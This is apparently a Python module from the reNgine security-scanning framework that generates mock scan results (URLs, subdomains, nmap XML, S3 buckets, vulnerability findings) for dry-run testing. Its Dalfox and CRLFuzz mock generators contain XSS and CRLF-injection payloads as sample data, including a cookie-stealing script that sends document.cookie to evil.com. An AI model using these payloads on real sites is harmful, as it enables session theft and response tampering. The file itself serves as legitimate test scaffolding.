"""
Mock data utilities for dry run testing
"""

import random

from reNgine.utils.logger import default_logger as logger
from reNgine.utils.parsers import parse_dalfox_result, parse_s3scanner_result


def generate_mock_urls(count=10, base_domains=None, subdomains=True, paths=True, params=False):
    """Generate mock URLs for dry run testing
    
    This function creates realistic-looking URLs that can be used during dry run tests
    to simulate real scan targets without actually querying the database or real systems.
    
    Args:
        count (int): Number of URLs to generate
        base_domains (list): List of base domains to use (e.g., ['example.com', 'test.org'])
                            If None, default domains will be used
        subdomains (bool): Whether to include subdomains
        paths (bool): Whether to include paths
        params (bool): Whether to include query parameters
        
    Returns:
        list: List of mock URLs
    """   
    # Default domains if none provided
    if not base_domains:
        base_domains = [
            'example.com', 
            'test.org', 
            'dryrun.local', 
            'mockdata.net',
            'fakescan.io'
        ]
    
    # Components for generating realistic-looking URLs
    subdomain_prefixes = [
        'api', 'dev', 'test', 'staging', 'prod', 'app', 'admin', 
        'portal', 'secure', 'login', 'web', 'mail', 'support', 
        'dashboard', 'vpn', 'docs', 'cdn', 'static', 'media'
    ]
    
    path_components = [
        'login', 'admin', 'dashboard', 'users', 'products', 'api', 
        'docs', 'help', 'support', 'profile', 'settings', 'search',
        'assets', 'images', 'css', 'js', 'upload', 'download'
    ]
    
    param_names = [
        'id', 'user', 'page', 'q', 'token', 'session', 'redirect',
        'sort', 'filter', 'limit', 'offset', 'type', 'format'
    ]
    
    # Generate URLs
    mock_urls = []
    for _ in range(count):
        # Start with a random base domain
        base_domain = random.choice(base_domains)
        url = f"https://{base_domain}"
        
        # Add subdomain (with 70% probability if enabled)
        if subdomains and random.random() < 0.7:
            prefix = random.choice(subdomain_prefixes)
            url = f"https://{prefix}.{base_domain}"
        
        # Add path (with 80% probability if enabled)
        if paths and random.random() < 0.8:
            path_depth = random.randint(1, 3)
            path = '/'.join(random.choice(path_components) for _ in range(path_depth))
            url = f"{url}/{path}"
            
            # Sometimes add file extension
            if random.random() < 0.3:
                extensions = ['.html', '.php', '.asp', '.jsp', '.json', '.xml']
                url = f"{url}{random.choice(extensions)}"
        
        # Add query parameters (with 40% probability if enabled)
        if params and random.random() < 0.4:
            param_count = random.randint(1, 3)
            query_params = []
            for _ in range(param_count):
                param = random.choice(param_names)
                value = f"value{random.randint(1, 100)}"
                query_params.append(f"{param}={value}")
            url = f"{url}?{'&'.join(query_params)}"
        
        mock_urls.append(url)
    
    logger.info(f"🧪 Generated {len(mock_urls)} mock URLs for dry run testing")
    return mock_urls

def generate_mock_nuclei_vulnerabilities(urls, count=5):
    """Generate mock vulnerability data for dry run testing
    
    Args:
        urls (list): List of URLs to associate vulnerabilities with
        count (int): Number of vulnerabilities to generate per URL
        
    Returns:
        list: List of mock vulnerability dictionaries
    """
    from datetime import datetime
    import random
    
    vulnerabilities = []
    severity_levels = ["critical", "high", "medium", "low", "info"]
    vulnerability_types = [
        "SQL Injection", "XSS", "CSRF", "Open Redirect", 
        "Information Disclosure", "SSRF", "Command Injection",
        "Directory Traversal", "RCE", "LFI", "XXE"
    ]
    
    for url in urls:
        for _ in range(count):
            severity = random.choice(severity_levels)
            vuln_type = random.choice(vulnerability_types)
            
            vulnerability = {
                "info": {
                    "name": f"Mock {vuln_type}",
                    "author": ["reNgine"],
                    "severity": severity,
                    "description": f"This is a mock {vuln_type.lower()} vulnerability found during dry run testing",
                    "reference": [
                        "https://owasp.org/",
                        "https://portswigger.net/web-security"
                    ],
                    "tags": [vuln_type.lower().replace(" ", "-"), "mock", "dry-run"]
                },
                "host": url,
                "matched-at": f"{url}/vulnerable-path",
                "extracted-results": ["mock-data-1", "mock-data-2"],
                "timestamp": datetime.now().isoformat(),
                "matcher-name": "mock-matcher",
                "template-id": f"mock-{vuln_type.lower().replace(' ', '-')}"
            }
            
            vulnerabilities.append(vulnerability)
    
    return vulnerabilities

def generate_mock_dalfox_vulnerabilities(urls, count=3):
    """Generate mock Dalfox XSS vulnerability data for dry run testing
    
    Args:
        urls (list): List of URLs to associate vulnerabilities with
        count (int): Number of vulnerabilities to generate per URL
        
    Returns:
        list: List of mock Dalfox vulnerability dictionaries
    """
    from datetime import datetime
    import random
    
    vulnerabilities = []
    
    # XSS Payloads commonly detected by Dalfox
    xss_payloads = [
        "<script>alert(1)</script>",
        "javascript:alert(document.domain)",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "'-alert(1)-'",
        "\"><script>alert(1)</script>",
        "<script>fetch('https://evil.com?cookie='+document.cookie)</script>"
    ]
    
    # Dalfox output message types
    message_types = [
        "Reflected XSS found",
        "DOM XSS found",
        "Stored XSS found",
        "Blind XSS potentially found",
        "CSP Bypass found",
        "Template injection found"
    ]
    
    # Parameters commonly vulnerable to XSS
    params = ["q", "search", "id", "user", "input", "query", "keyword", "redirect", "url", "data"]
    
    for url in urls:
        for _ in range(count):
            payload = random.choice(xss_payloads)
            param = random.choice(params)
            message_type = random.choice(message_types)
            
            # Create mock vulnerability with Dalfox expected structure
            vulnerability = {
                "param": param,
                "type": "xss",
                "payload": payload,
                "evidence": f"Found XSS in {param} parameter",
                "message": message_type,
                "message_str": f"Try this payload: {payload}",
                "severity": random.choice(["high", "medium", "critical"]),
                "url": f"{url}?{param}={payload}",
                "poc": f"curl -X GET '{url}?{param}={payload}'",
                "raw": f"GET /?{param}={payload} HTTP/1.1\nHost: {url.replace('https://', '').replace('http://', '')}\nUser-Agent: Mozilla/5.0\nAccept: */*",
                "recommendation": "Implement proper input validation and output encoding",
                "timestamp": datetime.now().isoformat()
            }
            
            vulnerabilities.append(vulnerability)
    
    return vulnerabilities

def generate_mock_crlfuzz_vulnerabilities(urls, count=3):
    """Generate mock CRLFUZZ vulnerability data for dry run testing
    
    Args:
        urls (list): List of URLs to associate vulnerabilities with
        count (int): Number of vulnerabilities to generate per URL
        
    Returns:
        list: List of mock CRLFUZZ vulnerability dictionaries
    """
    from datetime import datetime
    import random
    
    vulnerabilities = []
    
    # CRLF Injection payloads
    crlf_payloads = [
        "%0D%0ASet-Cookie: crlfinjection=crlfinjection",
        "%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23",
        r"%0D%0ASet-Cookie: csrf=fake_token",
        r"%%0d%0aLocation:%20https://evil.com",
        r"%E5%98%8D%E5%98%8ASet-Cookie:crlf=injection",
        r"%0dSet-Cookie:crlfinjection=crlfinjection",
        r"%0aSet-Cookie:crlfinjection=crlfinjection",
        r"%0d%0aSet-Cookie:%20malicious=1"
    ]
    
    # Response headers that might be affected
    affected_headers = [
        "Set-Cookie", 
        "Location", 
        "Content-Type", 
        "Content-Length", 
        "X-XSS-Protection", 
        "Content-Disposition"
    ]
    
    for url in urls:
        for _ in range(count):
            payload = random.choice(crlf_payloads)
            affected_header = random.choice(affected_headers)
            
            # Generate a mock vulnerable URL
            full_url = f"{url}?param={payload}"
            
            # Create mock vulnerability with CRLFUZZ expected structure
            vulnerability = {
                "url": full_url,
                "payload": payload,
                "impact": f"HTTP Header Injection affecting {affected_header}",
                "evidence": f"HTTP/1.1 200 OK\r\n{affected_header}: malicious_value\r\n",
                "severity": "medium",
                "description": "CRLF Injection allows attackers to inject headers into the HTTP response",
                "details": "This vulnerability occurs when user-supplied input that contains CR and LF characters is included in HTTP response headers without proper sanitization.",
                "remediation": "Validate and sanitize user input before including it in HTTP response headers. Use a whitelist approach to validate input.",
                "request": f"GET {full_url.replace(url, '')} HTTP/1.1\nHost: {url.replace('https://', '').replace('http://', '')}\nUser-Agent: Mozilla/5.0",
                "response": f"HTTP/1.1 200 OK\r\n{affected_header}: malicious_value\r\nContent-Type: text/html\r\n\r\n<html></html>",
                "timestamp": datetime.now().isoformat()
            }
            
            vulnerabilities.append(vulnerability)
    
    return vulnerabilities

def generate_mock_s3scanner_vulnerabilities(count=5):
    """Generate mock S3Scanner bucket data for dry run testing
    
    Args:
        count (int): Number of S3 buckets to generate
        
    Returns:
        list: List of mock S3Scanner bucket dictionaries
    """
    import random
    from datetime import datetime

    results = []

    # Providers for the mock data
    providers = ["AWS", "GCP", "Azure", "DigitalOcean", "Alibaba"]

    # Regions for AWS
    aws_regions = [
        "us-east-1", "us-east-2", "us-west-1", "us-west-2",
        "eu-west-1", "eu-central-1", "ap-south-1", "ap-northeast-1"
    ]

    # Company names for bucket naming
    companies = ["company", "enterprise", "corp", "org", "tech", "app", "data", "backup", "storage", "assets"]

    # Owner IDs
    owner_ids = [
        "a123b456c789d0123e456f789g0123h456i789",
        "b234c567d890e1234f567g890h1234i567j890",
        "c345d678e901f2345g678h901i2345j678k901",
        "d456e789f012g3456h789i012j3456k789l012"
    ]

    # Owner display names
    owner_names = [
        "S3Owner", 
        "AdminUser", 
        "BucketAdmin", 
        "CloudOps", 
        "DevOpsTeam", 
        "CompanyName"
    ]

    # Generate mock buckets
    for _ in range(count):
        company = random.choice(companies)
        purpose = random.choice(["backup", "data", "static", "media", "archive", "logs", "config", "assets"])
        env = random.choice(["dev", "prod", "test", "staging", "uat"])

        # Generate a realistic-looking bucket name
        bucket_name = f"{company}-{purpose}-{env}-{random.randint(1000, 9999)}"

        # For some buckets, simulate misconfiguration with public permissions
        is_misconfigured = random.random() < 0.6  # 60% chance of misconfiguration

        # Create the bucket data structure matching what S3Scanner would return
        bucket = {
            "bucket": {
                "name": bucket_name,
                "region": random.choice(aws_regions),
                "provider": random.choice(providers),
                "owner_display_name": random.choice(owner_names),
                "owner_id": random.choice(owner_ids),
                # Permissions - some set to misconfigured
                "perm_auth_users_read": random.random() < 0.3 if is_misconfigured else False,
                "perm_auth_users_write": random.random() < 0.2 if is_misconfigured else False,
                "perm_auth_users_read_acl": random.random() < 0.2 if is_misconfigured else False,
                "perm_auth_users_write_acl": random.random() < 0.1 if is_misconfigured else False,
                "perm_auth_users_full_control": random.random() < 0.1 if is_misconfigured else False,
                "perm_all_users_read": random.random() < 0.5 if is_misconfigured else False,
                "perm_all_users_write": random.random() < 0.3 if is_misconfigured else False,
                "perm_all_users_read_acl": random.random() < 0.2 if is_misconfigured else False,
                "perm_all_users_write_acl": random.random() < 0.2 if is_misconfigured else False,
                "perm_all_users_full_control": random.random() < 0.1 if is_misconfigured else False,
                # Bucket stats
                "num_objects": random.randint(5, 10000),
                "bucket_size": random.randint(1024, 1073741824),  # Size in bytes (1KB to 1GB)
                "created_at": (datetime.now().replace(
                    day=random.randint(1, 28),
                    month=random.randint(1, 12),
                    year=random.randint(2020, 2023)
                )).isoformat(),
                "url": f"https://{bucket_name}.s3.amazonaws.com/"
            },
            "timestamp": datetime.now().isoformat(),
            "scan_id": f"s3scan-{random.randint(10000, 99999)}"
        }

        results.append(bucket)

    return results

def generate_mock_subdomain_data(domain, count=10):
    """Generate mock subdomain data for dry run testing
    
    Args:
        domain (str): Base domain
        count (int): Number of subdomains to generate
        
    Returns:
        list: List of mock subdomain dictionaries
    """
    import random

    prefixes = [
        "www", "api", "mail", "blog", "dev", "staging", "test", 
        "admin", "app", "cdn", "static", "media", "shop", "store"
    ]

    subdomains = [
        {
            "name": domain,
            "is_active": True,
            "status_code": 200,
            "page_title": f"{domain.capitalize()} - Home",
            "content_length": random.randint(5000, 50000),
            "technology_stack": ["nginx", "jquery", "bootstrap"],
            "ip_addresses": [
                f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"
            ],
        }
    ]
    # Add random subdomains
    selected_prefixes = random.sample(prefixes, min(count-1, len(prefixes)))
    for prefix in selected_prefixes:
        subdomain_name = f"{prefix}.{domain}"
        status_code = random.choice([200, 200, 200, 301, 302, 404, 403, 500])

        subdomain = {
            "name": subdomain_name,
            "is_active": status_code in [200, 301, 302],
            "status_code": status_code,
            "page_title": f"{prefix.capitalize()} - {domain.capitalize()}" if status_code == 200 else "",
            "content_length": random.randint(1000, 100000) if status_code == 200 else 0,
            "technology_stack": random.sample(["nginx", "apache", "jquery", "react", "angular", "django"], k=random.randint(1, 4)),
            "ip_addresses": [f"192.168.{random.randint(1, 254)}.{random.randint(1, 254)}"]
        }

        subdomains.append(subdomain)

    return subdomains

def generate_mock_nmap(host, output_file=None):
    """Generate mock nmap XML output for port scan testing
    
    Args:
        host (str): Host to generate results for
        output_file (str): Optional output file to write XML to
        
    Returns:
        str: XML content as string if output_file is None, otherwise None
    """
    import xml.dom.minidom as minidom
    import xml.etree.ElementTree as ET
    from datetime import datetime
    import random
    import os

    # Create root structure
    nmaprun = ET.Element("nmaprun")
    nmaprun.set("scanner", "nmap")
    nmaprun.set("args", f"nmap -Pn -sV --open {host}")
    nmaprun.set("start", str(int(datetime.now().timestamp())))
    nmaprun.set("startstr", datetime.now().strftime("%a %b %d %H:%M:%S %Y"))
    nmaprun.set("version", "7.92")
    nmaprun.set("xmloutputversion", "1.05")

    # Add scaninfo element
    scaninfo = ET.SubElement(nmaprun, "scaninfo")
    scaninfo.set("type", "connect")
    scaninfo.set("protocol", "tcp")
    scaninfo.set("numservices", "5")
    scaninfo.set("services", "21,80,443,8080,8443")

    # Create host element
    host_elem = ET.SubElement(nmaprun, "host")
    host_elem.set("starttime", str(int(datetime.now().timestamp())))
    host_elem.set("endtime", str(int(datetime.now().timestamp()) + random.randint(5, 30)))

    # Add status, address, hostnames
    status = ET.SubElement(host_elem, "status")
    status.set("state", "up")
    status.set("reason", "user-set")

    address = ET.SubElement(host_elem, "address")
    address.set("addr", "192.168.1.1")  # Mock IP address
    address.set("addrtype", "ipv4")

    hostnames = ET.SubElement(host_elem, "hostnames")
    hostname = ET.SubElement(hostnames, "hostname")
    hostname.set("name", host)
    hostname.set("type", "user")

    # Add ports section
    ports = ET.SubElement(host_elem, "ports")
    
    # Configure ports and services to include
    port_configs = [
        {"portid": "21", "service_name": "ftp", "product": "FTPd", "version": "3.0.3"},
        {"portid": "80", "service_name": "http", "product": "nginx", "version": "1.18.0"},
        {"portid": "443", "service_name": "https", "product": "nginx", "version": "1.18.0"},
        {"portid": "8080", "service_name": "http", "product": "apache", "version": "2.4.41"},
        {"portid": "8443", "service_name": "https", "product": "apache", "version": "2.4.41"}
    ]
    
    # Add port elements
    for config in port_configs:
        port = ET.SubElement(ports, "port")
        port.set("protocol", "tcp")
        port.set("portid", config["portid"])
        
        state = ET.SubElement(port, "state")
        state.set("state", "open")
        state.set("reason", "syn-ack")
        
        service = ET.SubElement(port, "service")
        service.set("name", config["service_name"])
        service.set("product", config["product"])
        service.set("version", config["version"])
        service.set("method", "probed")
        service.set("conf", "10")
    
    # Add times element
    runstats = ET.SubElement(nmaprun, "runstats")
    finished = ET.SubElement(runstats, "finished")
    finished.set("time", str(int(datetime.now().timestamp()) + random.randint(10, 60)))
    finished.set("timestr", (datetime.now()).strftime("%a %b %d %H:%M:%S %Y"))
    finished.set("summary", "Nmap done: 1 IP address (1 host up) scanned")
    
    # Generate the XML string
    xmlstr = ET.tostring(nmaprun).decode()
    pretty_xml = minidom.parseString(xmlstr).toprettyxml(indent="  ")
    
    # Write to file if specified
    if output_file:
        os.makedirs(os.path.dirname(output_file), exist_ok=True)
        with open(output_file, 'w') as f:
            f.write(pretty_xml)
        return None
    
    return pretty_xml

def prepare_port_scan_mock(host, results_dir, context=None):
    """Prepare mock port scan data for a host
    
    Args:
        host (str): Host to generate port scan data for
        results_dir (str): Directory to store results
        context (dict): Additional context
        
    Returns:
        dict: Port scan results
    """
    from pathlib import Path
    from reNgine.utils.nmap import parse_http_ports_data
    from reNgine.utils.formatters import SafePath

    logger.info(f'🔍 Preparing mock port scan data for {host}')

    try:
        filename = f"{host}_nmap.xml"
        xml_file = SafePath.create_safe_path(
            base_dir=results_dir,
            components=[filename],
            create_dir=False
        )

        # Generate and write mock data
        generate_mock_nmap(host, output_file=xml_file)

        return parse_http_ports_data(xml_file) if Path(xml_file).exists() else None
    except Exception as e:
        logger.exception(f"Failed to prepare mock port scan data: {str(e)}")
        return None

def prepare_subdomain_mock(host, context=None):
    """Prepare mock subdomain data for a domain
    
    Args:
        host (str): Base domain to generate subdomain data for
        context (dict): Additional context
        
    Returns:
        list: Serialized subdomain data
    """
    from api.serializers import SubdomainSerializer

    logger.info(f'🔍 Preparing mock subdomain data for {host}')

    try:
        return _formatted_subdomain_data(
            host, context, SubdomainSerializer
        )
    except Exception as e:
        logger.exception(f"Failed to prepare mock subdomain data: {str(e)}")
        return []


def _formatted_subdomain_data(host, context, SubdomainSerializer):
    from startScan.models import Subdomain
    from reNgine.utils.db import save_subdomain

    # Generate mock data
    mock_data = generate_mock_subdomain_data(host, count=10)

    # Convert mock data to expected format
    subdomains = []
    for mock_subdomain in mock_data:
        subdomain, _ = save_subdomain(mock_subdomain['name'], ctx=context)

        # Update additional fields if available
        if isinstance(subdomain, Subdomain) and hasattr(subdomain, 'update_info'):
            metadata = {k: v for k, v in mock_subdomain.items() if k != 'name'}
            subdomain.update_info(metadata)
            subdomains.append(subdomain)

    return SubdomainSerializer(subdomains, many=True).data

def prepare_urls_mock(ctx, input_path):
    from reNgine.utils.mock import generate_mock_urls

    # Get domain from context if available for more realistic mocks
    domain = None
    if ctx and 'domain' in ctx:
        domain = ctx.get('domain')
        base_domains = [domain]
    else:
        base_domains = None

    # Generate mock URLs for dry run
    logger.debug('🧪 Generating mock URLs for dry run mode')
    result = generate_mock_urls(count=15, base_domains=base_domains)

            # Write mock URLs to file if specified
    if input_path:
        with open(input_path, 'w') as f:
            f.write('\n'.join(result))
    return result

def prepare_nuclei_vulnerability_mock(urls, context=None):
    """Prepare mock vulnerability data for a set of URLs
    
    Args:
        urls (list): URLs to generate vulnerability data for
        context (dict): Additional context
        
    Returns:
        dict: Vulnerability scan results
    """
    logger.info(f'🔍 Preparing mock vulnerability data for {len(urls)} URLs')

    try:
        vulnerabilities = generate_mock_nuclei_vulnerabilities(urls, count=5)

        return {
            'status': 'completed',
            'vulnerabilities': vulnerabilities,
            'total_count': len(vulnerabilities),
            'critical_count': sum(
                v['info']['severity'] == 'critical' for v in vulnerabilities
            ),
            'high_count': sum(
                v['info']['severity'] == 'high' for v in vulnerabilities
            ),
            'medium_count': sum(
                v['info']['severity'] == 'medium' for v in vulnerabilities
            ),
            'low_count': sum(
                v['info']['severity'] == 'low' for v in vulnerabilities
            ),
            'info_count': sum(
                v['info']['severity'] == 'info' for v in vulnerabilities
            ),
        }
    except Exception as e:
        logger.exception(f"Failed to prepare mock vulnerability data: {str(e)}")
        return {'status': 'error', 'message': str(e)}

def prepare_dalfox_vulnerability_mock(urls, context=None):
    """Prepare mock Dalfox XSS vulnerability data
    
    Args:
        urls (list): URLs to generate vulnerability data for
        context (dict): Additional context
        
    Returns:
        dict: Vulnerability scan results
    """
    logger.info(f'🔍 Preparing mock Dalfox vulnerability data for {len(urls)} URLs')
    
    try:
        vulnerabilities = generate_mock_dalfox_vulnerabilities(urls, count=3)
        
        # Parse the mock vulnerabilities through the same parser used for real results
        parsed_vulnerabilities = []
        for vuln in vulnerabilities:
            parsed_vuln = parse_dalfox_result(vuln)
            parsed_vulnerabilities.append(parsed_vuln)
            
        return {
            'status': 'completed',
            'vulnerabilities': parsed_vulnerabilities,
            'total_count': len(parsed_vulnerabilities)
        }
    except Exception as e:
        logger.exception(f"Failed to prepare mock Dalfox vulnerability data: {str(e)}")
        return {'status': 'error', 'message': str(e)}

def prepare_crlfuzz_vulnerability_mock(urls, context=None):
    """Prepare mock CRLFUZZ vulnerability data
    
    Args:
        urls (list): URLs to generate vulnerability data for
        context (dict): Additional context
        
    Returns:
        dict: Vulnerability scan results
    """
    logger.info(f'🔍 Preparing mock CRLFUZZ vulnerability data for {len(urls)} URLs')

    try:
        vulnerabilities = generate_mock_crlfuzz_vulnerabilities(urls, count=3)

        # Parse the mock vulnerabilities 
        parsed_vulnerabilities = []
        parsed_vulnerabilities.extend(iter(vulnerabilities))
        return {
            'status': 'completed',
            'vulnerabilities': parsed_vulnerabilities,
            'total_count': len(parsed_vulnerabilities)
        }
    except Exception as e:
        logger.exception(f"Failed to prepare mock CRLFUZZ vulnerability data: {str(e)}")
        return {'status': 'error', 'message': str(e)}

def prepare_s3scanner_vulnerability_mock(context=None):
    """Prepare mock S3Scanner bucket data
    
    Args:
        context (dict): Additional context
        
    Returns:
        dict: S3 bucket scan results
    """
    logger.info('🔍 Preparing mock S3Scanner bucket data')

    try:
        buckets = generate_mock_s3scanner_vulnerabilities(count=5)

        # Parse the mock buckets through the same parser used for real results
        parsed_buckets = []
        for bucket in buckets:
            parsed_bucket = parse_s3scanner_result(bucket)
            parsed_buckets.append(parsed_bucket)

        return {
            'status': 'completed',
            'buckets': parsed_buckets,
            'total_count': len(parsed_buckets),
            'insecure_count': sum(
                any(
                    [
                        b.get('perm_all_users_read'),
                        b.get('perm_all_users_write'),
                        b.get('perm_all_users_read_acl'),
                        b.get('perm_all_users_write_acl'),
                        b.get('perm_all_users_full_control'),
                    ]
                )
                for b in parsed_buckets
            ),
        }
    except Exception as e:
        logger.exception(f"Failed to prepare mock S3Scanner bucket data: {str(e)}")
        return {'status': 'error', 'message': str(e)}
